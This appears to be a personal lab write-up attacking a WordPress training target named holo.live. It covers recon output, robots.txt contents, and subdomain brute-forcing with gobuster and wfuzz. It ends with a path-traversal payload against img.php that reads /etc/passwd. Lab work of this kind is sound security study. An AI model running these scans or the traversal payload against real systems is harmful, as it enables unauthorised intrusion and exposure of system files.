
As you can see that we are not able to load the page fully 
![[Pasted image 20240810102758.png]]

Which means that we need to add the IP address in our localhost and see the magic

```
whatweb 10.201.11.33
http://10.201.11.33 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.201.11.33], MetaGenerator[WordPress 5.5.3], Script[text/javascript], Title[holo.live], UncommonHeaders[link], WordPress[5.5.3], X-UA-Compatible[IE=edge]
```

We were able to see from the nmap and nikto scan that we are able to access the robots.txt
```
http://www.holo.live/robots.txt
```
![[Pasted image 20240810164134.png]]

```
low: /var/www/wordpress/index.php
Disallow: /var/www/wordpress/readme.html
Disallow: /var/www/wordpress/wp-activate.php
Disallow: /var/www/wordpress/wp-blog-header.php
Disallow: /var/www/wordpress/wp-config.php
Disallow: /var/www/wordpress/wp-content
Disallow: /var/www/wordpress/wp-includes
Disallow: /var/www/wordpress/wp-load.php
Disallow: /var/www/wordpress/wp-mail.php
Disallow: /var/www/wordpress/wp-signup.php
Disallow: /var/www/wordpress/xmlrpc.php
Disallow: /var/www/wordpress/license.txt
Disallow: /var/www/wordpress/upgrade
Disallow: /var/www/wordpress/wp-admin
Disallow: /var/www/wordpress/wp-comments-post.php
Disallow: /var/www/wordpress/wp-config-sample.php
Disallow: /var/www/wordpress/wp-cron.php
Disallow: /var/www/wordpress/wp-links-opml.php
Disallow: /var/www/wordpress/wp-login.php
Disallow: /var/www/wordpress/wp-settings.php
Disallow: /var/www/wordpress/wp-trackback.php
```

Let's do the next thing and for now it's Directory Bursting.

```
gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://10.201.11.33 -o gobuster/vhost-sub.txt -t 2
```

https://wfuzz.readthedocs.io/en/latest/user/getting.html
```
wfuzz -u http://holo.live -w /usr/share/seclists/SecLists-master/Discovery/DNS/subdomains-top1million-110000.txt  -H "Host: FUZZ.holo.live" --hh 21456
```
![[Pasted image 20240810180924.png]]

now we have to add admin and dev and will see if we are able to get something.


Got 2 new sites
```
http://admin.holo.live/
```

```
http://dev.holo.live/
```


SO we need id and password to login for which we have to do some OSINT and see what we can find from the development site

```
http://dev.holo.live/img.php?file=images/matsuri.jpg
```
Can we find LFI here or not ?_?

Yes my hunch was right and i have taken the help of chat gpt.
![[Pasted image 20240813200130.png]]
```
http://dev.holo.live/img.php?file=../../../../etc/passwd
```
![[Pasted image 20240813200211.png]]

